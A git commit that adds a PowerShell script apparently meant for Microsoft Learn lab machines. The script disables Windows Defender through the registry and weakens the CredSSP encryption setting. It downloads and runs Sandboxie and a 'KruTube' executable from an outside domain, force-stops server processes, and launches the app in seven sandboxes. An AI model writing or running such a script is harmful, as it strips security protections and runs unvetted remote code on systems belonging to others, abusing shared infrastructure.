24a7cf6c0bbb908c5380748109fe00416aa7d3c0
user009dm <161681994+user009dm@users.noreply.github.com>
2024-05-14 16:15:04 +0500

    Create a.ps1

---
+++ a.ps1
@@ -0,0 +1,31 @@
+$pagefile = Get-WmiObject Win32_ComputerSystem -EnableAllPrivileges
+$pagefile.AutomaticManagedPagefile = $false
+$pagefile.put() | Out-Null
+$pagefileset = Get-WmiObject Win32_PageFileSetting
+$pagefileset.InitialSize = 90024
+$pagefileset.MaximumSize = 90048
+$pagefileset.Put() | Out-Null
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Force
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters\" -Name AllowEncryptionOracle -Value 2
+Invoke-WebRequest -Uri "https://letsunlockphone.com/rdpdfsffddf/Sandboxie-new.zip" -OutFile "C:\Users\MS Learn Labs\Desktop\Sandboxie-new.zip"
+Expand-Archive -Path "C:\Users\MS Learn Labs\Desktop\Sandboxie-new.zip" -DestinationPath "C:\Users\MS Learn Labs\Desktop"
+Start-Process -FilePath "C:\Users\MS Learn Labs\Desktop\Sandboxie\SandMan.exe"
+Invoke-WebRequest -Uri "https://letsunlockphone.com/rdpdfsffddf/krutube_9.3.13.1.zip" -OutFile "C:\Users\MS Learn Labs\Desktop\krutube_9.3.13.1.zip"
+Expand-Archive -Path "C:\Users\MS Learn Labs\Desktop\krutube_9.3.13.1.zip" -DestinationPath "C:\Users\MS Learn Labs\Desktop"
+Start-Process -FilePath "C:\Users\MS Learn Labs\Desktop\KruTube\KruTube.exe"
+Write-Host "Press any key to continue..."
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+Start-Service -Name "audiosrv"
+Stop-Process -Name "sqlservr", "Batch", "w3wp", "explorer" -Force
+Start-Process -FilePath "explorer.exe"
+Start-Process -FilePath "C:\Users\MS Learn Labs\Desktop\KruTube\KruTube.exe"
+Write-Host "Press any key to continue..."
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+$boxes = 1..7
+foreach ($box in $boxes) {
+    & "C:\Users\MS Learn Labs\Desktop\Sandboxie\sbieini.exe" set $box "Enabled y"
+    & "C:\Users\MS Learn Labs\Desktop\Sandboxie\sbieini.exe" set $box "AutoRecover n"
+    & "C:\Users\MS Learn Labs\Desktop\Sandboxie\sbieini.exe" set $box "BorderColor #00FFFF,ttl,6"
+    & "C:\Users\MS Learn Labs\Desktop\Sandboxie\sbieini.exe" set $box "BoxNameTitle y"
+    Start-Process -FilePath "Start.exe" -ArgumentList "/box:$box `"`"C:\Users\MS Learn Labs\Desktop\KruTube\KruTube.exe`"`""
+}
